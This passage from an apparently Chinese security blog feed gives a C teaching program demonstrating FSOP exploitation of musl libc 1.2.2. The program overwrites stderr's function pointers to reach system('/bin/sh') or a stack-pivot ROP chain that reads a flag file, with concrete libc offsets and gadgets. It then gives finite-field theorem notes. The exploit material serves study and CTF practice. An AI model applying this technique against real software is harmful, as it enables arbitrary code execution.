function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//MY_HOW2HEAP_MUSL_UTIL_H</span></span></span><br></pre></td></tr></table></figure><p>c文件<code>musl_FSOP.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;musl_util.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_shell 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> orw 2</span></span><br><span class="line"><span class="comment">// 重要！在这里修改利用模式</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mode orw</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* flag = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">char</span>* bin_sh = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">size_t</span> enough_space[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">size_t</span> fake_stack[<span class="number">0x40</span>];</span><br><span class="line"><span class="type">char</span> flag_content[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示musl libc的FSOP利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;测试环境：ubuntu 22.04，musl版本：1.2.2。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;与glibc相似，FSOP也是musl的一种重要的利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是musl libc中FILE结构体的定义：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/internal/stdio_impl.h, line 21)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned flags;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *rpos, *rend;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31mint (*close)(FILE *);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *wend, *wpos;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *mustbezero_1;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *wbase;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31msize_t (*read)(FILE *, unsigned char *, size_t);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31msize_t (*write)(FILE *, const unsigned char *, size_t);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31moff_t (*seek)(FILE *, off_t, int);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tsize_t buf_size;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *prev, *next;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint fd;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint pipe_pid;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tlong lockcount;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint mode;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvolatile int lock;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint lbf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvoid *cookie;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\toff_t off;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tchar *getln_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvoid *mustbezero_2;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *shend;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\toff_t shlim, shcnt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *prev_locked, *next_locked;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tstruct __locale_struct *locale;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;用红色标出的4行表示4个函数指针，这是我们利用的关键。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;又注意到exit函数有调用链：exit-&gt;__stdio_exit-&gt;close_file。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/stdio/__stdio_exit.c, line 16)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;void __stdio_exit(void)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfor (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stdin_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stdout_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stderr_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/stdio/__stdio_exit.c, line 8)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static void close_file(FILE *f)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (!f) return;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFFINALLOCK(f);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以看到3个标准IO的FILE结构体都可能会调用write和seek函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;如果能够修改这些函数指针的值，就能够执行任意代码。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此无论如何，首先要做的就是获取libc的基地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们就利用stderr标准错误FILE结构体的地址来获取。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> stderr_addr = (<span class="type">size_t</span>)<span class="built_in">stderr</span>;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;stderr的地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\033[0m&quot;</span>, stderr_addr);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;stderr在libc中的偏移量为0xAD080。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> libc_base = stderr_addr - <span class="number">0xAD080</span>;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;计算得到libc的基地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\n\033[0m&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mode == get_shell)&#123;</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;你选择了get shell模式。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;在get shell模式中，我们需要修改stderr的3处内容：\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;1. 开头，需修改为字符串\&quot;/bin/sh\&quot;。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;2. wpos或wbase，使得这两个值不等即可。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;3. write函数指针，修改为system的地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;需要注意调用write函数时，第一个参数是FILE结构体地址。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此需要在FILE开头写字符串，从而get shell。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> system_addr = (<span class="type">size_t</span>)system;</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;system的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        <span class="built_in">strcpy</span>((<span class="type">char</span>*)stderr_addr, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;wbase = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;write = (<span class="type">size_t</span> (*)(FILE*, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">size_t</span>))system_addr;</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;调教完成的stderr：\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)stderr_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后只需要调用exit函数即可。\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mode == orw)&#123;</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;你选择了orw模式。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;orw的利用方式较get shell要复杂一些。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;但对于stderr而言还是只需要修改3个地方：\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;1. 偏移0x30处，修改为修改为新栈的地址。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;2. wbase，偏移0x38，修改为第一个gadget的地址。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;3. write函数指针，修改为栈迁移的gadget的地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;在偏移0x789F5处有这样一个gadget：\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;0x00000000000789f5 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;考虑到write函数调用的第一个参数为stderr地址，rdi=stderr地址。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;按照上面的方案修改stderr，可以完美实现栈迁移。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;准备伪造栈的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\n\033[0m&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> pivot_gadget = libc_base + <span class="number">0x789F5</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rdi = libc_base + <span class="number">0x152A1</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rsi = libc_base + <span class="number">0x1B0A1</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rdx = libc_base + <span class="number">0x2A50B</span>;</span><br><span class="line"></span><br><span class="line">        ((FILE*)stderr_addr)-&gt;mustbezero_1 = (<span class="type">unsigned</span> <span class="type">char</span>*)fake_stack;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;wbase = (<span class="type">unsigned</span> <span class="type">char</span>*)pop_rdi;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;write = (<span class="type">size_t</span> (*)(FILE*, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">size_t</span>))pivot_gadget;</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;调教完成的stderr：\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)stderr_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;一些有用的gadget：\n&quot;</span>);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rdi ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rdi);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rsi ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rsi);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rdx ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rdx);</span><br><span class="line"></span><br><span class="line">        fake_stack[<span class="number">0</span>] = (<span class="type">size_t</span>)flag;   <span class="comment">// open函数参数1</span></span><br><span class="line">        fake_stack[<span class="number">1</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">2</span>] = <span class="number">0</span>;              <span class="comment">// open函数参数2</span></span><br><span class="line">        fake_stack[<span class="number">3</span>] = (<span class="type">size_t</span>)open;   <span class="comment">// 调用open</span></span><br><span class="line">        fake_stack[<span class="number">4</span>] = pop_rdi;</span><br><span class="line">        fake_stack[<span class="number">5</span>] = <span class="number">3</span>;              <span class="comment">// read函数参数1</span></span><br><span class="line">        fake_stack[<span class="number">6</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">7</span>] = (<span class="type">size_t</span>) flag_content;  <span class="comment">// read函数参数2</span></span><br><span class="line">        fake_stack[<span class="number">8</span>] = (<span class="type">size_t</span>) pop_rdx;</span><br><span class="line">        fake_stack[<span class="number">9</span>] = <span class="number">0x20</span>;           <span class="comment">// read函数参数3</span></span><br><span class="line">        fake_stack[<span class="number">10</span>] = (<span class="type">size_t</span>)read;  <span class="comment">// 调用open</span></span><br><span class="line">        fake_stack[<span class="number">11</span>] = pop_rdi;</span><br><span class="line">        fake_stack[<span class="number">12</span>] = <span class="number">1</span>;             <span class="comment">// write函数参数1</span></span><br><span class="line">        fake_stack[<span class="number">13</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">14</span>] = (<span class="type">size_t</span>) flag_content;  <span class="comment">// write函数参数2</span></span><br><span class="line">        fake_stack[<span class="number">15</span>] = (<span class="type">size_t</span>) pop_rdx;</span><br><span class="line">        fake_stack[<span class="number">16</span>] = <span class="number">0x20</span>;          <span class="comment">// write函数参数3</span></span><br><span class="line">        fake_stack[<span class="number">17</span>] = (<span class="type">size_t</span>)write; <span class="comment">// 调用write</span></span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;新栈内容：\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)fake_stack, <span class="number">20</span> * <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后只需要调用exit函数即可。\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，在musl libc中FSOP的方法有很多，这里只是演示了其中一种。更多的利用方式还是需要通过多看多做来掌握。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息安全数学基础 Chapter 3——有限域（二）</title>
      <link href="/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E6%9C%89%E9%99%90%E5%9F%9F%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E6%9C%89%E9%99%90%E5%9F%9F%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><font color=purple>定理3.20</font> 设$\mathbb F_q$为q元有限域，$f(x)\in \mathbb F_q[x]$为n次不可约多项式，那么有$f(x)|x^{q^n}-x$</p><p><font color=dblue>证明方法：</font>构造$f(x)$的扩域$\mathbb F_q[x]<em>{f(x)}$，对于任意$x\in F_q[x]</em>{f(x)}$均有$x^{q^n}-x&#x3D;0$（定理3.19），则有$(x^{q^n}-x)_{f(x)}&#x3D;0$（定理3.7）。证毕。</p><hr><p><font color=purple>定理3.21</font> 设$m,n$均为正整数，则有$(x^m-1,x^n-1)&#x3D;x^{(m,n)}-1$</p><p><font color=dblue>证明方法：</font>归纳法。<br>当$max{m,n}&#x3D;1$时显然成立<br>假设当$max{m,n}&#x3D;k$时成立，若$m&gt;n$，那么有$(x^m-1,x^n-1)&#x3D;(x^{m-n}-1,x^n-1)$（定理3.11），此时$max{m,n}&lt;k$，故成立。</p><p><font color=orange>推论</font> 设$m,n,q$为整数，则$(x^{q^m}-x,x^{q^n}-x)&#x3D;x^{q^{(m,n)}}-x$（使用上面定理即可，证明略）</p><hr><p><font color=purple>定理3.22</font> 设$\mathbb F_q$为q元域，$n$为正整数，$f(x)\in\mathbb F_q[x]$为m次不可约多项式，且$m&gt;n$，那么$f(x)∤x^{q^n}-x$</p><p><font color=dblue>证明方法：</font>反证法。</p><p>假设能够整除。则有$x^{q^n}<em>{f(x)}&#x3D;x</em>{f(x)}$<br>对于任意$\mathbb F_q[x]<em>{f(x)}$中元素$g(x)&#x3D;\sum</em>{i&#x3D;0}^{m-1}a_ix^i$，有<br>$$g(x)^{q^n}&#x3D;\sum_{i&#x3D;0}^{m-1}(a_ix^i)^{q^n}$$<br>（二项式定理）<br>根据定理3.19有<br>$$g(x)^{q^n}&#x3D;\sum_{i&#x3D;0}^{m-1}a_i(x^i)^{q^n}$$<br>注意$(a_i)^{q^n}&#x3D;a_i$<br>因此<br>$$(g(x)^{q^n}-g(x))<em>{f(x)}&#x3D;\sum</em>{i&#x3D;0}^{m-1}a_i((x^i)^{q^n}-x^i)<em>{f(x)}&#x3D;\sum</em>{i&#x3D;0}^{m-1}a_i((x^{q^n})^i-x^i)<em>{f(x)}&#x3D;\sum</em>{i&#x3D;0}^{m-1}a_i(x^i-x^i)_{f(x)}&#x3D;0$$</p><p>故任意$\mathbb F_q[x]_{f(x)}$中元素均是$x^{q^n}-x$的根，而$n&lt;m$，故矛盾。</p><hr><p><font color=purple>定理3.23</font> 设$\mathbb F_q$为q元域，$n,d$为正整数，$f(x)\in\mathbb F_q[x]$为$d$次不可约多项式，那么有$f(x)|x^{q^n}-x$当且仅当$d|n$。</p><p><font color=dblue>证明方法：</font><br>充分性：$f(x)|x^{q^d}-x$，根据定理3.21，$x^{q^d}-x|x^{q^n}-x$，证毕<br>必要性：$f(x)|x^{q^d}-x,f(x)|x^{q^n}-x\Rightarrow f(x)|(x^{q^d}-x, x^{q^n}-x)&#x3D;x^{q^{(d,n)}}-x$，又$\deg(f(x))&#x3D;d\le (d,n)$，故$d|n$</p><hr><p><font color=blue>定义3.10</font> 导式</p><hr><p><font color=blue>定义3.11</font> 重因式、k重因式、重根、k重根、导式</p><hr><p><font color=purple>定理3.24</font> $\mathbb F_q$为q元有限域，$f(x),g(x)\in\mathbb F_q[x]$，若$g(x)$是$f(x)$的k重因式，则$g(x)^{k-1}|f’(x)$</p><p><font color=dblue>证明方法：</font>求导</p><p><font color=orange>推论1</font> $\mathbb F_q$为q元有限域，$f(x)\in\mathbb F_q[x]$，若$(f(x),f’(x))&#x3D;1$，则$f(x)$在域$\mathbb F_q$上没有重因式，也没有重根。（证明反证法）<br><font color=orange>推论2</font> $\mathbb F_q$为q元有限域，n为正整数，则$x^{q^n}-x$在域$\mathbb F_q$上没有重因式。（用推论1证明）</p><p><font 